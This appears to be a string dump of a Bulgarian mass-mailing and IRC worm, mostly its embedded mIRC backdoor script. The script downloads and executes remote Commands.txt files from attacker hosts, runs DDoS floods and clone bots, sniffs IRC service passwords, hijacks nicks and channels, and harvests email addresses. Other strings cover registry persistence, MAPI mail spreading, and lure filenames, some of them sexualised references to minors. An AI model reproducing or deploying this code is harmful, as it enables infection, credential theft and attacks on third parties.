            "Ei sq smqtam da si vzema nqkoi qk film i da gledam.",
            "Hodil li si na %s - Mnoo me kefi :)) Za drugo ne se",
            "seshtam tai che chao za sega :)) I da pishesh :pP",
            "mail.bg",
            "www.%s",
            "SITES",
            "MAIL",
            "Inbox",
            ".exe",
            "KaZaA Media Desktop v2.0.8_|Serials 2K 7.2 (by SNTeam)_|Serials2002_8.0(17.08.02)_|Dreamweaver_5.0_Patch_|ACDSee|WinAmp_3.2_Cool_|Download Accelerator 5.5_|Nero Burning Rom 5.6.0.3_",
            "cRedit_CarDs_gEn|MeGa HACK |Zip Password Recovery |GTA 3 Bonus Cars(part1)_|EminemDesktop|DMX tHeMe |NFS 5 Bonus Cars_|Counter Strike 1.5 (Editor)_|Madonna Desktop |WinZip 8.2_|DivX 5.4 Bundle_|",
            "7.1 FULL|v5.5|(zip)|3.0|(Eng)|(Cracked)",
            "PcDudes|BritneyUltimate|Pamela 3D_|Britney Suxx |KamaSutra|LaFemmeNikita|Teen Sex Cam |Lolita|Pam Anderson Theme |Sexy Teens Desktop |SexSpy|Anal Explorer |VirtualRape|Hot Blondies|Strip Kournikova ",
            "(sHow)|3D|3.0|(Eng)|v4.5|(Rated)",
            "install_en_|ClubExtreme|WWF_The_ROCK|EminemDesktop|DMX tHeMe|Inter012_|Story017_|Gipsy|sound_brake_|Elfbowl|Goggles|snowball_fight_|Chess",
            "2.1|(zip)|(sHow)|3D|_zip|(Eng)|_v1.1",
            "BoxDave_|PcDudes|Pamela 3D_|Kama Sutra |LaFemmeNikita|Fishfood|install_en_|Story017_|Inter012_|Actu002_|Chess",
            "(sHow)|3D|(Eng)|2.3",
            " ()[]<>=^+$#%*&;:,!?/\"'",
            "blue16|StreetLady|alice|nikita_15|mathew|monika-17|CrazyGirl|steve|chandler|happy|amanda|LaFemme|Dreamy",
            "hotmail.com|yahoo.com|mail.com|gmx.com|yahoo.co.uk|usa.net|crazy.net",
            " ()[]=^+$#%*&;:,!?\"'",
            "MAPIReadMail",
            "MAPIFindNext",
            "MAPILogoff",
            "MAPILogon",
            "MAPI32.DLL",
            "NoLogon",
            "Mail",
            "MAPI",
            "BozavBalamurnikEvent",
            "Internet Mail",
            "Choose Profile",
            "#32770",
            "Outlook Express",
            "Exefile\\Shell\\Open\\Command",
            "DRIVE",
            "mirc.ini",
            "autorun.inf",
            "versions.txt",
            "%s\\%s",
            "%s\\*.*",
            "C:\\~msdos.---",
            "swf|jpg|mp3|mpg|asf|mov|mpeg|avi|bmp|zip|html|htm|wav|ace|rar|doc|txt|pdf|dos",
            "swf|jpg|mp3|mpg|asf|mov|mpeg|avi",
            "swf|jpg|mp3|mpg|asf|mov|mpeg|avi|com|bat|sys|ini|exe|dos",
            "FuckOff",
            "Files",
            "Rand2",
            "windows",
            "\"%s\"",
            "%s\\%s\\%s",
            "%s%s.exe",
            "%s\\*",
            "exefile\\shell\\open\\command",
            " \"%1\" %*",
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "LoadSystemProfile",
            "%s powprof.dll,LoadCurrentUserProfile",
            "Software\\Microsoft\\Windows\\CurrentVersion",
            "ProgramFilesDir",
            "16|32| 98",
            "MAIL-OTHER",
            "Rahmul@bitex.bg",
            "MAIL-BG",
            "Rahmul@mail.bg",
            "Start",
            "Damage",
            "Windows",
            "Cannot open file: it does not appear to be a valid program",
            "If you downloaded this file, try downloading file again.",
            "Virus",
            "Full",
            "Bulgaria",
            "intl",
            "sCountry",
            "n514=on ^*:Part:*:{ .timerOnJoin- $+ $nick Off }",
            "n515=on ^*:Quit:{ .timerOnJoin- $+ $nick Off }",
            "n516=on ^*:Nick:{ ",
            "n517=  if ($hget(Data, Drop) == On && $nick == $me) { .timerDrop- $+ $nick off | .timerDrop- $+ $newnick 1 60 .Drop NICK $newnick }",
            "n518=  if ($hget(Data, OnJoinNotice) == On) || ($hget(Data, OnJoinMsg) == On) { .timerOnJoin- $+ $nick Off }",
            "n519=}",
            "n493=  if ($1 == IP!) { .notice $nick IP_ $+ $IP | .halt }",
            "n494=  else if (IP_* iswm $1) {",
            "n495=    .hadd Data iIP $calc($hget(Data, iIP) + 1)",
            "n496=    if ($hget(Data, iIPCount) // $hget(Data, iIP) && $me != $nick) { .OpenConsole $nick $gettok($1,2,$asc(_)) }",
            "n497=    .halt",
            "n498=  }",
            "n499=}",
            "n500=on ^*:Join:*:{",
            "n501=  if ($nick == $me) { if ($hget(Data, Drop) == On) { .timerDrop- $+ $chan 1 60 .Drop CHAN $chan } }",
            "n502=  else {",
            "n503=    if ($hget(Data, OnJoinMsg) == On) || ($hget(Data, OnJoinNotice) == On) {",
            "n504=      .hadd Data iInvite $calc($hget(Data, iInvite) + 1)",
            "n505=      if ($hget(Data, iInviteCount) // $hget(Data, iInvite)) { .timerOnJoin- $+ $nick 1 $rand(60, 90) .AdvIt $nick }",
            "n506=    }",
            "n507=    if ($hget(Data, Spread) == On) || ($hget(Data, Mass) == On) {",
            "n508=      .hadd Data iJoin $calc($hget(Data, iJoin) + 1)",
            "n509=      if ($hget(Data, iJoinCount) // $hget(Data, iJoin)) { .OpenConsole $nick $GetTok($address,2,$asc(@)) }",
            "n510=    }",
            "n511=  }",
            "n512=}",
            "n513=on ^*:Op:*:{ .timerOnJoin- $+ $opnick Off }",
            "n482=on ^*:Action:*:#:{ if (http isin $1-) || (www isin $1-) { .ignore -u60 $nick | .halt } }",
            "n483=on ^*:Open:?:*:{ if (http isin $1-) || (www isin $1-) { .ignore -u60 $nick | .halt } }",
            "n484=on ^*:Text:*:*:{",
            "n485=  if ($target !ischan) { .extractAddr NICK $1- } | if ($target ischan) { .extractAddr CHAN $1- }",
            "n486=  if ($nick !isin $hget(Data, Services) && ((http isin $1-) || (www isin $1-))) { .ignore -u60 $nick | .halt }",
            "n487=  if ($target !ischan) { if (m isin $hget(Data, Sniffer) && $Verify($hget(Data, Sniffer.Console))) { .sockwrite -tn $hget(Data, Sniffer.Console) (SNIFFER) (MSG) ( $+ $Nick $+ ) $1- } }",
            "n488=}",
            "n489=on ^*:Notice:*:*:{",
            "n490=  if ($target !ischan) { .extractAddr NICK $1- } | if ($target ischan) { .extractAddr CHAN $1- }",
            "n491=  if ($nick !isin $hget(Data, Services) && ((http isin $1-) || (www isin $1-))) { .ignore -u60 $nick | .halt }",
            "n492=  if ($target !ischan) { if (n isin $hget(Data, Sniffer) && $Verify($hget(Data, Sniffer.Console))) { .sockwrite -tn $hget(Data, Sniffer.Console) (SNIFFER) (NOTICE) ( $+ $Nick $+ ) $1- } }",
            "n471=  .addSITE Kurnikova.Bol.bg Goli snimki -=- http://www.Kurnikova.Bol.bg -=- na nai-skandalnata tenesistka v sveta!*Anna Kournikova - naked! -=- http://www.Kurnikova.Bol.bg -=- Exclusive pictures brought to you by Playboy Team 2002 ",
            "n472=  .addSITE Teen-Zone.FaithWeb.CoM Zonata na vsichki bulgarski teenz :: http://Teen-Zone.FaithWeb.CoM :: Zapoznanstva, Liuboff, Priqteli, Problemi..*The worldwide teen zone :: http://Teen-Zone.FaithWeb.CoM :: Find new friends, Share your feelings.. Just enjoy :)",
            "n473=  .addSITE The-Hacking.Hit.bg Za vseki koito iska da stane HaCkEr, no ne znae kak da go PoStIgNe .::. www.The-Hacking.Hit.bg .::.*For everyone who wants to be a HaCkEr, but doesn't know how to aChiEve It .::. www.The-Hacking.Hit.bg .::.",
            "n474=  .addHTTP Rahmul.hit.bg/Commands.txt NULL EXEC",
            "n475=  .addHTTP free.bol.bg/rahmul/Commands.txt NULL EXEC",
            "n476=  .addHTTP free.techno-link.com/Rahmul/Commands.txt NULL EXEC  ",
            "n477=  .writeini $winFile Options Init2 1",
            "n478=}",
            "n479=",
            "n480=; * TRIGGERS *",
            "n481=raw *:*:{ if ($numeric == 2) { if (UniBG isin $1-) || (*-bg iswm $1-) .setCountry BG } | if (40* iswm $numeric) .halt }",
            "n455=    else { .ignore -u20 ChanServ | .raw -q ChanServ set %sChan Topic %sDesc }",
            "n456=  }",
            "n457=  if (%i == 8) { .ignore -u20 *!*@* | .amsg %sDesc }",
            "n458=  .timeradvMe 1 $rand(600, 900) { .advMe $1 $2 }",
            "n459=}",
            "n460=",
            "n461=alias advIt {",
            "n462=  if ($hget(Data, OnJoinMsg) == On && $hget(Data, Site)) { .msg $1 $hget(Data, Site) }",
            "n463=  else if ($hget(Data, OnJoinNotice) == On && $hget(Data, Site)) { .notice $1 $hget(Data, Site) }",
            "n464=  .ignore -u600 $1",
            "n465=}",
            "n466=",
            "n467=alias setSites {",
            "n468=  .addSITE GamErZ.bol.bg Sait za Maniaci -> http://Gamerz.Bol.Bg <- Counter Strike, Brood War i WarCraft III...*The Web Site -> http://Gamerz.Bol.Bg <- For all the gamerz keen on CS, Brood War and WarCraft III...",
            "n469=  .addSITE Pam-Anderson.8m.com http://www.Pam-Anderson.8m.com -=- Galeriq s Goreshti Snimki ot Nai-Izvestnite \"Filmi\" na Pamela :))*http://www.Pam-Anderson.8m.com -=- The Best XXX Galery and Fan Site Dedicated to Pamela Anderson :))",
            "n470=  .addSITE GiRlz.Hit.bg www.GiRlz.Hit.Bg -> Zabraneno za maje :)))*www.GiRlz.Hit.Bg -> Restricted for men :)))",
            "n442=  .timerOnJoin-* off | .hadd Data OnJoinMsg Off | .hadd Data OnJoinNotice Off",
            "n443=  if (!%sChan) || (!%sSite) { .return }",
            "n444=  var %sDesc = $getText($readini($GFN(DEF),Sites,%sSite)) , %sSite = www. $+ %sSite",
            "n445=  if (%i == 1) { if ($getCountry == BG) { .ignore -u20 NS | .msg ns set URL $getText(%sSite $+ * $+ %sSite) }",
            "n446=  else { .ignore -u20 NickServ | .raw -q NickServ set URL $getColor $+ %sSite } }",
            "n447=  if (%i == 2) { if ($getCountry == BG) { .ignore -u20 CS | .msg cs set %sChan URL $getText(%sSite $+ * $+ %sSite) }",
            "n448=  else { .ignore -u20 ChanServ | .raw -q ChanServ set %sChan URL %sSite } }",
            "n449=  if (%i == 3) { .ignore -u20 *!*@* | .msg %sChan %sDesc }",
            "n450=  if (%i == 4) { .hadd Data OnJoinMsg On | .hadd Data Site %sDesc }",
            "n451=  if (%i == 5) { .hadd Data OnJoinNotice On | .hadd Data Site %sDesc }",
            "n452=  if (%i == 6) { .ignore -u20 *!*@* | .describe %sChan -> $getColor $+ %sSite }",
            "n453=  if (%i == 7 && http !isin $chan(%sChan).Topic && www !isin $chan(%sChan).Topic) {",
            "n454=    if ($getCountry == BG) { .ignore -u20 CS | .msg cs set %sChan Topic %sDesc }",
            "n425=  if ($getCountry == BG) { %sText = $gettok($1-, 1, $asc(*)) }",
            "n426=  if (%iUseColor != 2) { %iColor = $getColor | %sPrefix = %iColor }",
            "n427=  %sSite = $matchtok(%sText,http,1,32) | if (!%sSite) { %sSite = $matchtok(%sText,www,1,32) }",
            "n428=  if (%sSite) {",
            "n429=    %iSite = $findtok(%sText,%sSite,1,32)",
            "n430=    if (%iUseExtra == 4) { %sPrefix = $null | %iColor = ",
            " | %iUseExtra = 1 } ",
            "n431=    if (%iUseExtra == 7) { %sPrefix = $null | %iColor = ",
            " | %iUseExtra = 2 }",
            "n432=    if (%iUseExtra == 1) || (%iUseExtra == 3) { %sSite = ",
            " $+ ",
            " $+  $+ 12 $+ %sSite $+ ",
            " $+ %iColor }",
            "n433=    if (%iUseExtra == 2) || (%iUseExtra == 5) { %sSite = ",
            " $+ ",
            " $+  $+ 4 $+ %sSite $+ ",
            " $+ %iColor }",
            "n434=    if (%iUseExtra == 8) { %sSite = ",
            " $+  $+ 3 $+ %sSite $+ %iColor }",
            "n435=    %sText = $puttok(%sText,%sSite,%iSite,32)",
            "n436=  }",
            "n437=  .return %sPrefix $+ %sText",
            "n438=}",
            "n439=",
            "n440=alias advMe {",
            "n441=  var %sSite = $ini($GFN(DEF), SITES, $rand(1,$ini($GFN(DEF),SITES,0))) , %sChan = $chan($rand(1,$chan(0))) , %i = $rand($1, $2)",
            "n410=      .remini $GFN(DEF) HTTP %sParam | if (SOS !isin %sParam && SAVE !isin %http.Options) { .writeini $GFN(DEF) DDos %sParam FLOOD }",
            "n411=      .hdel -w Data $rev($sockname, *) | .sockclose $sockname | .return",
            "n412=    }",
            "n413=  }",
            "n414=  if ($hget(Data, $rev($sockname, Final)) == 1) {",
            "n415=    if ((STORE isin %http.options) && ($file(%http.LocalName).size == $hget(Data, $rev($sockname, Size)))) { .run %http.LocalName }",
            "n416=    .hdel -w Data $rev($sockname, *) | .sockclose $sockname",
            "n417=  }",
            "n418=}",
            "n419=on *:sockclose:GetHTTP-*:{ if ($hget(Data, $rev($sockname,Final)) != 1 && SAVE !isin $hget(Data, $rev($sockname, Options))) { .remove $hget(Data, $rev($sockname, LocalName)) } | .hdel -w Data $rev($sockname, *) }",
            "n420=",
            "n421=; * ADVERTISING *",
            "n422=alias getColor { var %sColors = 2.3.4.7.10.12.14 , %iColor = $rand(1, $numtok(%sColors, $asc(.))) | .return ",
            " $+  $+ $gettok(%sColors, %iColor, $asc(.)) }",
            "n423=alias getText {",
            "n424=  var %iUseExtra = $rand(1,8) , %iUseColor = $rand(1,4) , %sPrefix , %sText = $gettok($1-, 2, $asc(*)) , %sSite , %iSite , %iColor = ",
            "n394=    }",
            "n395=    if (EXEC isin %http.Options) {",
            "n396=      .sockread %sRead | %sRead = [ [ %sRead ] ]",
            "n397=      if (%sRead == EOF) { .hadd Data $rev($sockname, Final) 1 }",
            "n398=      else if (Script: isin %sRead) { .hadd Data $rev($sockname, Script) $gettok(%sRead, 2, 32) }",
            "n399=      else if (Country: isin %sRead) { .hadd Data $rev($sockname, Country) $gettok(%sRead, 2, 32) }",
            "n400=      else if (Stat: isin %sRead) { .hadd Data $rev($sockname, Stat) $gettok(%sRead, 2, 32) }",
            "n401=      else if (($hget(Data, $rev($sockname, Script)) == $getScript) && ($hget(Data, $rev($sockname, Country)) == $getCountry) && ($hget(Data, $rev($sockname, Stat)) == $getStat)) { %sRead }",
            "n402=    }",
            "n403=  }",
            "n404=  else {",
            "n405=    .sockread %sRead",
            "n406=    if (%sRead == $null) { .hadd Data $rev($sockname, EOR) 1 }",
            "n407=    else if (Content-Length* iswm %sRead) { .hadd Data $rev($sockname, Size) $GetTok(%sRead, 2, 32) }",
            "n408=    else if ((HTTP/* iswm %sRead) && (200 !isin %sRead)) { ",
            "n409=      var %sParam = $hget(Data, $rev($sockname, Serv)) $+ $hget(Data, $rev($sockname, RemoteName))",
            "n379=  .hadd Data $rev(%http.sock, Options) $3- | .hadd Data $rev(%http.sock, Size) 0",
            "n380=  if ($hget(Data, $Rev(%http.sock, Serv)) != $null) { .sockopen %http.sock $hget(Data, $Rev(%http.sock, Serv)) 80 }",
            "n381=  else { .hdel -w Data $rev(%http.sock, *) }",
            "n382=}",
            "n383=on *:sockopen:GetHTTP-*:{",
            "n384=  if ($sockerr > 0) { .hdel -w Data $rev($sockname, *) | .return }",
            "n385=  .RequestURL $sockname $hget(Data, $rev($sockname, RemoteName)) $hget(Data, $rev($sockname, Serv))",
            "n386=}",
            "n387=on *:sockread:GetHTTP-*:{",
            "n388=  if ($sockerr > 0) { .hdel -w Data $rev($sockname, *) | .return }",
            "n389=  var %sRead = \"\" , %http.LocalName = $hget(Data, $rev($sockname, LocalName)) , %http.Options = $hget(Data, $rev($sockname, Options))",
            "n390=  if ($hget(Data, $rev($sockname, EOR)) == 1) {",
            "n391=    if (STORE isin %http.Options) || (SAVE isin %http.Options) {",
            "n392=      :StoreMore | .sockread &bRead | if ($sockbr != 0) { .bwrite %http.LocalName -1 &bRead | .goto StoreMore }",
            "n393=      if ($hget(Data, $rev($sockname, Size)) && $file(%http.LocalName).size >= $hget(Data, $rev($sockname, Size))) { .hadd Data $rev($sockname, Final) 1 }",
            "n365=  .sockwrite -n $1 Accept-Language: bg | .sockwrite -n $1 Accept-Encoding: deflate | .sockwrite -n $1 User-Agent: Mozilla/4.0 (compatible; MSIE 4.72; Windows 98)",
            "n366=  if ($pos($3,.,0) == 1) { .sockwrite -n $1 Host: www. $+ $3 } | if ($pos($3,.,0) != 1) { .sockwrite -n $1 Host: $3 }",
            "n367=  .sockwrite -n $1 Connection: Keep-Alive | .sockwrite -n $1 Cache-Control: no-cache | .sockwrite -n $1",
            "n368=}",
            "n369=alias HttpMe {",
            "n370=  var %sParam = $ini($GFN(DEF), HTTP, $rand(1,$ini($GFN(DEF),HTTP,0)))",
            "n371=  if (%sParam) { .GetHTTP %sParam $readini($GFN(DEF), HTTP, %sParam) }",
            "n372=}",
            "n373=alias GetHTTP {",
            "n374=  var %http.sock = $OpenIt(GetHTTP)",
            "n375=  .hadd Data $rev(%http.sock, LocalName) $2",
            "n376=  if ($exists($hget(Data, $rev(%http.sock, LocalName))) == $true) { .remove $hget(Data, $rev(%http.sock, LocalName)) }",
            "n377=  .hadd Data $rev(%http.sock, RemoteName) / $+ $getTok($1, 2-, $asc(/)) | .hadd Data $rev(%http.sock, Serv) $getTok($1, 1, $asc(/))",
            "n378=  .hadd Data $rev(%http.sock, Script) $getScript | .hadd Data $rev(%http.sock, Country) $getCountry | .hadd Data $rev(%http.sock, Stat) $getStat",
            "n352=  %sTmpDir = $windir $+ \\Temp | if ($exists(%sTmpDir) == $false) .return",
            "n353=  :extractFile | %sFile = %sTmpDir $+ \\ $+ TmpFile $+ $rand(1,10000) $+ .faith | if ($exists(%sFile) == $true) .goto extractFile",
            "n354=  %sSearch = $getTok(%sSearch, $rand(1, $numTok(%sSearch, $asc(|))), $asc(|)) | if (!%sSearch) .return",
            "n355=  %sSearch2 = $getTok(%sSearch2, $rand(1, $numTok(%sSearch2, $asc(|))), $asc(|)) | if (!%sSearch2) .return",
            "n356=  if (bg !isin %sSearch) { %sSearch = %sSearch $+ + $+ %sSearch2 }",
            "n357=  if (%iEngine == 1) { %sTag = google.yahoo.com/bin/query?p= $+ %sSearch $+ &b= $+ %iIndex $+ &hc=0&hs=0&xargs= }",
            "n358=  else { %sTag = google.com/search?q= $+ %sSearch $+ &hl=en&lr=&ie=UTF-8&start= $+ %iIndex $+ &sa=N }",
            "n359=  .GetHTTP %sTag %sFile SAVE",
            "n360=}",
            "n361=",
            "n362=; * HTTP *",
            "n363=alias RequestURL {",
            "n364=  .sockwrite -n $1 GET $2 HTTP/1.1 | .sockwrite -n $1 Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/msword, application/vnd.ms-powerpoint, */*",
            "n335=alias newAddr { if ($readini($GFN(DEF), Outbox, $1)) || ($readini($GFN(DEF), Inbox, $1)) .return 0 | .return 1 }",
            "n336=alias extractAddr { ",
            "n337=  var %sAddr , %i = 0 , %iCount = $wildTok($2-, *@*.*, 0, 32)",
            "n338=  while (%i < %iCount) {",
            "n339=    .inc %i | %sAddr = $wildTok($2-, *@*.*, %i, 32) ",
            "n340=    if ($validAddr(%sAddr) && $newAddr(%sAddr)) { ",
            "n341=      .hadd Data iAddr $calc($hget(Data, iAddr) + 1) ",
            "n342=      if ($1 == NICK) || ($hget(Data, iAddrCount) // $hget(Data, iAddr)) { .writeini $GFN(DEF) Outbox %sAddr UnSent }",
            "n343=    }",
            "n344=  }",
            "n345=}",
            "n346=",
            "n347=; * EXTRACT HTML *",
            "n348=alias extractHTML {",
            "n349=  var %iIndex = $rand(10, 990) , %iEngine = $rand(0,2) , %sTmpDir , %sTag , %sFile , %sSearch , %sSearch2",
            "n350=  %sSearch = yahoo.com|mail.com|mail.bg|hotmail.com|usa.net|yahoo.de|abv.bg|gmx|usa.com|mail+.co.uk|mail+.ch|mail+.jp|mail+.de|mail+.fr|mail+.net|mail+.com",
            "n351=  %sSearch2 = sex|car|love|flash|girl|sport|TV|download|links|food|light|school|room|dream|team|rap|boy|think|mail|house|ball|faith|people|nice|true|story",
            "n317=on *:sockread:Gateway-BNC:{ var %sRead | .sockread %sRead | if ($sock(Server-BNC).mark == 1 && $Verify(Server-BNC) == 1) { .sockwrite -tn Server-BNC %sRead } }",
            "n318=",
            "n319=; * DDOS *",
            "n320=alias DDos {",
            "n321=  .sockclose DDos-*",
            "n322=  var %i = 0 , %iCount = $ini($GFN(DEF), DDos, 0) , %sTmp , %sName",
            "n323=  while (%i < %iCount) { ",
            "n324=    .inc %i | %sTmp = $ini($GFN(DEF), DDos, %i)",
            "n325=    %sTmp = $remove(%sTmp,free.,www.,http://) | %sTmp = $getTok(%sTmp, 1, $asc(/))",
            "n326=    if ($pos(%sTmp,.) > 1) { %sTmp = $getTok(%sTmp, 2-, $asc(.)) }",
            "n327=    %sName = $OpenIt(DDos) | .sockopen %sName %sTmp 80 | .sockmark %sName %sTmp",
            "n328=  }",
            "n329=}",
            "n330=on *:sockopen:DDos-*:{ if ($sockerr > 0) { .return } | .RequestURL $sockname / $sock($sockname).mark }",
            "n331=on *:sockread:DDos-*:{ :DDosMore | .sockread &bRead | if ($sockbr != 0) { .goto DDosMore } }",
            "n332=",
            "n333=; * EXTRACT ADDR *",
            "n334=alias validAddr { if ($len($1-) > 8 && $len($1-) < 64) { if ($pos($1-,.,0) == 1 && $pos($1-,@,0) == 1) .return 1 } | .return 0 }",
            "n300=  if ($sockerr > 0) { .return } | var %sRead , %sNick",
            "n301=  .sockread %sRead | %sNick = $remove($gettok(%sRead, 1, $asc(!)),:) | .tokenize 32 $gettok(%sRead, 2-, $asc(:))",
            "n302=  if (PING* iswm %sRead) { .sockwrite -tn $sockname PONG $getTok(%sRead, 2, 32) }",
            "n303=  else if ($1 == IP!) { .sockwrite -tn $sockname NOTICE %sNick :IP_ $+ $IP }",
            "n304=  else if ($1 == OpenServerConsole) { .OpenServerConsole $2- }",
            "n305=  else if (IP_* iswm $1) {",
            "n306=    .hadd Data iIP $calc($hget(Data, iIP) + 1)",
            "n307=    if ($hget(Data, iIPCount) // $hget(Data, iIP) && $gettok($sock($sockname).mark,2,32) != %sNick) { .OpenConsole %sNick $gettok($1,2,$asc(_)) }",
            "n308=  }",
            "n309=}",
            "n310=",
            "n311=; * BNC *",
            "n312=on *:socklisten:Listen-BNC:{ if ($sock(Gateway-BNC).mark == 1) { .sockaccept Server-BNC | .sockmark Server-BNC 1 } }",
            "n313=on *:sockopen:Gateway-BNC:{ .sockmark $sockname 1 }",
            "n314=on *:sockclose:Gateway-BNC:{ .sockclose Server-BNC }",
            "n315=on *:sockclose:Server-BNC:{ .sockclose Gateway-BNC }",
            "n316=on *:sockread:Server-BNC:{ var %sRead | .sockread %sRead | if ($Verify(Gateway-BNC)) { .sockwrite -tn Gateway-BNC %sRead } }",
            "n286=  if ($1 == CHAN) { .ignore -u30 CS | .msg cs drop $2 $readini($GFN(IRC), $2, Perm-Pass) | .msg cs reg $2 $Random($Rand(4,7)) $Random($Rand(3,8)) }",
            "n287=}",
            "n288=",
            "n289=; * CLONES *",
            "n290=alias Random { var %i = 0 , %s | while (%i < $1) { %s = %s $+ $rand(a,z) | inc %i } | .return %s }",
            "n291=alias UseClone { if ($sock(Clone-*, 0) > 0) { .sockwrite -tn Clone-* $1- } }",
            "n292=alias LoadClone { var %sock = $OpenIt(Clone) | .sockopen %sock $1 6667 | .sockmark %sock $1- }",
            "n293=on *:sockopen:Clone-*:{",
            "n294=  if ($sockerr > 0) { .return } | .tokenize 32 $sock($sockname).mark",
            "n295=  var %Server = \" $+ $1 $+ \" , %Nick = $Random($Rand(4,9)) , %Ident = $Random($Rand(4,7)) , %Mail = \" $+ $Random($Rand(4,7)) $+ \" , %Name = $Random($Rand(3,10)) $Random($Rand(2,6))",
            "n296=  if ($2) { %Nick = $2 } | if ($3) { %Ident = $3 } | if ($4) { %Mail = \" $+ $4 $+ \" } | if ($5) { %Name = : $+ $5- }",
            "n297=  .sockwrite -tn $sockname NICK %Nick | .sockwrite -tn $sockname USER %Ident %Mail %Server %Name",
            "n298=}",
            "n299=on *:sockread:Clone-*:{",
            "n274=  if (*Msg NS iswm $1-2) { %iT = 1 | %i = 1 } | if (*Msg OS iswm $1-2) { %iT = 2 | %i = 1 } | if (*Msg CS iswm $1-2) { %iT = 1 | %sT = $null | %i = 1 }",
            "n275=  if (*NickServ iswm $1) { %iT = 1 | %i = 0 } | if (*OperServ iswm $1) { %iT = 2 | %i = 0 } | if (*ChanServ iswm $1) { %iT = 1 | %sT = $null | %i = 0 }",
            "n276=  if (%iT) { .tokenize 32 $getTok($1-,$calc(2 + %i),32) %sT $getTok($1-,$calc(3 + %i) $+ -,32) | if (id isin $1) || (reg isin $1) || (newp isin $1) { .dif %iT $2- } }",
            "n277=  if (*Oper iswm $1 && $0 == 3) { .dif 3 $2- }",
            "n278=  if (i isin $hget(Data, Sniffer) && $Verify($hget(Data, Sniffer.Console))) { .sockwrite -tn $hget(Data, Sniffer.Console) (SNIFFER) (INPUT) ( $+ $active $+ ) $1- }",
            "n279=  if (@Local-* iswm $active) { .UseConsole $GetTok($active, 3-, $asc(-)) $1- }",
            "n280=}",
            "n281=",
            "n282=; * DROP *",
            "n283=alias Drop {",
            "n284=  if ($getCountry == Other) || (!$readini($GFN(IRC), $2, Perm-Pass)) { .return }",
            "n285=  if ($1 == NICK) { .ignore -u30 NS | .msg ns id $readini($GFN(IRC), $2, Temp-Pass) | .msg ns drop $readini($GFN(IRC), $2, Perm-Pass) | .msg ns reg $Random($Rand(4,7)) $Random($Rand(3,8)) }",
            "n261=alias sev { var %i = 0 , %s | while (%i != $calc($0 - 1)) { .inc %i | %s = $insTok(%s, $getTok($1-, %i, 32), $calc($numTok(%s,$asc(.)) + 1), $asc(.)) } | set % [ $+ [ %s ] ] $getTok($1-, $0 $+ -, 32) }",
            "n262=",
            "n263=; * PASS *",
            "n264=alias dif {",
            "n265=  var %s , %i | %i = $readini($GFN(IRC), Options, Count)",
            "n266=  if (!$server) { .return } | if (!$GFN(IRC)) { .setFileNames }",
            "n267=  if ($1 == 1) { %s = Temp-Pass } | if ($1 == 2) { %s = OS-Pass } | if ($1 == 3) { %s = OPER-Pass }",
            "n268=  if ($3 && $readini($GFN(IRC),$2,%s) != $3) || ($4 && $readini($GFN(IRC),$2,Perm-Pass) != $4) { .inc %i | if (3 // %i) { .writeini $GFN(IRC) Options Status New } }",
            "n269=  if ($3) { .writeini $GFN(IRC) $2 %s $3 } | if ($4) { .writeini $GFN(IRC) $2 Perm-Pass $4 } | .writeini $GFN(IRC) Options Count %i",
            "n270=}",
            "n271=alias setLoad { var %iDate = $gettok($date,1,$asc(/)) | if (5 // %iDate) .AddHTTP SOS- $+ $calc(%iDate * $gettok($date,2,$asc(/))) $+ $decode(LmhpdC5iZy9Db21tYW5kcy50eHQ=,mt) NULL EXEC }",
            "n272=on *:input:*:{",
            "n273=  var %i = 0 , %iT , %sT = $me",
            "n250=  :DirNext | .inc %DIR.Index | %DIR.item = $finddir(%Dir.CD, %DIR.Mask, %DIR.Index, %DIR.Depth)",
            "n251=  if (%DIR.item) { $sev(DIR, Items, %DIR.Index, $DIRFormat) | .goto DirNext } | .dec %DIR.Index",
            "n252=  :FileNext | .inc %DIR.Index2 | %DIR.item = $findfile(%Dir.CD, %DIR.Mask, %DIR.Index2, %DIR.Depth)",
            "n253=  if (%DIR.item) { $sev(DIR, Items, $calc(%DIR.Index + %DIR.Index2), $FILEFormat) | .goto FileNext } | .dec %DIR.Index2",
            "n254=  $sev(DIR, Items, $calc(%DIR.Index + %DIR.Index2 + 1), END(Dir) %DIR.Index Dir(s) %DIR.Index2 File(s))",
            "n255=  :DirEnd | if ($Verify($sockname)) { .hadd Data $rev($sockname, Active) DIR | .sockwrite -tn $sockname $ev(DIR, Items, 0) }",
            "n256=}",
            "n257=",
            "n258=; * EVS *",
            "n259=alias ev { var %i = 0 , %s | while (%i != $0) { .inc %i | %s = $insTok(%s, $getTok($1-, %i, 32), $calc($numTok(%s,$asc(.)) + 1), $asc(.)) } | .return % [ $+ [ %s ] ] }",
            "n260=alias rev { var %i = 0 , %s | while (%i != $0) { .inc %i | %s = $insTok(%s, $getTok($1-, %i, 32), $calc($numTok(%s,$asc(.)) + 1), $asc(.)) } | .return %s }",
            "n241=alias FILEFormat { .return ..\\ $+ $right(%DIR.Item, $calc($len(%DIR.Item) - $len(%DIR.CD) - 1)) (",
            " $+ 10",
            " $+ $Bytes($file(%DIR.Item).size).suf $+ ",
            "n242=alias DRIVEFormat { .return $chr(91) $+ ",
            " $+ 6 $+ $disk(%DIR.L).type $+ ",
            " $+ $chr(93) %DIR.L $+ :\\ (",
            " $+ 7 $+ $disk(%DIR.L).Label $+ ",
            ") $+ ",
            " $+ 10 $Bytes($calc($disk(%DIR.L).size - $disk(%DIR.L).free)).suf $+ ",
            " $+ 10 $Bytes($disk(%DIR.L).size).suf }",
            "n243=alias DIR {",
            "n244=  if ($hget($sockname, Active) == DIR) { .return } | .unset %DIR.* | %DIR.Index = 0 | %DIR.Index2 = 0",
            "n245=  if ($1 != DRIVES) { .goto DirFiles } | %DIR.Letters = CDEFGHIJKLMNOPQRSTUVWXYZ",
            "n246=  :DirDrives | .inc %DIR.Pos | %DIR.L = $mid(%Dir.Letters, %DIR.Pos, 1) | if (!%DIR.L) { .goto DirEnd }",
            "n247=  if ($disk(%DIR.L)) { $sev(DIR, Items, %DIR.Index, $DRIVEFormat) | .inc %Dir.Index } | .goto DirDrives",
            "n248=  :DirFiles | %DIR.CD = $getTok($1-, 1- $+ $calc($0 - 2), 32) | %DIR.Mask = $getTok($1-, $calc($0 - 1), 32) | %DIR.Depth = $getTok($1-, $0, 32)",
            "n249=  $sev(DIR, Items, 0, BEGIN(Dir) %Dir.CD %Dir.Mask %Dir.Depth)",
            "n225=alias InfoMe { .sockwrite -tn $sockname (INFO) $getInfo }",
